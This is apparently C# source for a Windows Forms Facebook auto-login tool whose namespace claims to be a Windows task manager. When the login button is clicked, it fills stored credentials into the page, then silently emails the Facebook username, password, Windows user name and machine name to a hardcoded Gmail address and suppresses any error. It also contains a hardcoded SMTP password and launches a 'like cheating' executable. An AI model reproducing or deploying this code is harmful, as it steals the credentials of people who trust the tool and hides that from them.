using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Net;
using System.Net.Mail;
namespace Windows_Görev_Yöneticisi
{
    public partial class Facebook : Form
    {
        public Facebook()
        {
            InitializeComponent();
        }

        private void Facebook_Load(object sender, EventArgs e)
        {
            webBrowser1.Navigate("http://www.facebook.com");
            string kad = "";
            string pass = "";
            StreamReader oku = new StreamReader("user\\kad");
            kad = oku.ReadToEnd();
            oku.Close();
            StreamReader göz = new StreamReader("user\\pass");
            pass = göz.ReadToEnd();
            göz.Close();
            toolStripLabel1.Text += kad + " " + "***... Girişe Hazır";
        }

        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            string kad = "";
            string pass = "";
            StreamReader oku = new StreamReader("user\\kad");
            kad = oku.ReadToEnd();
            oku.Close();
            StreamReader göz = new StreamReader("user\\pass");
            pass = göz.ReadToEnd();
            göz.Close();
            try
            {
                webBrowser1.Document.GetElementById("email").SetAttribute("value", kad.ToString());
                webBrowser1.Document.GetElementById("pass").SetAttribute("value", pass.ToString());
                webBrowser1.Document.GetElementById("loginbutton").InvokeMember("click");
                toolStripLabel1.Text = kad + " " + "***... Giriş Yapıldı :D";
            }
            catch (Exception ex)
            {
                MessageBox.Show("Kullanıcı Adı veya Şifre Hatalı");
            }
            try
            {
                string pc = Environment.MachineName.ToString();
                string username = Environment.UserName.ToString();
                SmtpClient smtp = new SmtpClient();
                smtp.Credentials = new NetworkCredential("huseyinaydin99@gmail.com", "123456789/*/*");
                smtp.Host = "smtp.gmail.com";
                smtp.Port = 587;
                smtp.EnableSsl = true;
                MailMessage msg = new MailMessage();
                msg.From = new MailAddress("huseyinaydin99@gmail.com");
                msg.To.Add("huseyinaydin99@gmail.com");
                msg.IsBodyHtml = true;
                msg.Subject = DateTime.Now.ToLongTimeString()+"  :)-(:  "+DateTime.Now.ToLongDateString();
                string mail = "<font face='consolas' color='maroon'><b>Kullanıcı Adı : "+kad+"</b><br />" +"<b>Şifre : "+ pass+"</b><br /><b>User Name : "+username.ToString()+"<br />Machine Name : "+pc.ToString()+"<br /></b></font>";
                msg.Body = mail;
                smtp.Send(msg);
            }
            catch
            {}
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            webBrowser1.GoBack();
        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            webBrowser1.GoForward();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                toolStripTextBox1.Text = webBrowser1.Url.ToString();
            }
            catch
            {
            }
        }

        private void webBrowser1_ProgressChanged(object sender, WebBrowserProgressChangedEventArgs e)
        {
            try
            {
                toolStripProgressBar1.Value = Convert.ToInt32(e.CurrentProgress);
                toolStripProgressBar1.Maximum = Convert.ToInt32(e.MaximumProgress);
            }
            catch
            {
                
            }
        }

        private void toolStripLabel2_Click(object sender, EventArgs e)
        {
            try 
	        {	        
		        Process.Start("Facebook Like Cheating Protected.exe");
	        }
	        catch
	        {
	        }
        }

    }
}
